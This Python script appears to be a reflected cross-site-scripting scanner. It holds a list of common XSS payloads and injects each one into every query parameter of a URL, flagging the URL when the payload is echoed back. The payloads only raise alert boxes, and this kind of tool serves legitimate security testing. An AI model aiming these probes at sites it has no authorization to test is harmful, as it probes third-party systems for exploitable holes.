import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# XSS payloads to test
xss_payloads = [
    "<script>alert(1)</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert('XSS')>",
    "<script>confirm(1)</script>",
    "'><svg/onload=alert(String.fromCharCode(88,83,83))>//"
]



def inject_xss_payloads(url):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return None  # No parameters to test

    vulnerable = []

    for param in query_params:
        for payload in xss_payloads:
            test_params = query_params.copy()
            test_params[param] = payload

            # Rebuild URL with XSS payload
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    print(f"[!] Possible XSS found in: {test_url}")
                    vulnerable.append(test_url)
            except Exception as e:
                print(f"[!] Error testing {test_url}: {e}")

    return vulnerable
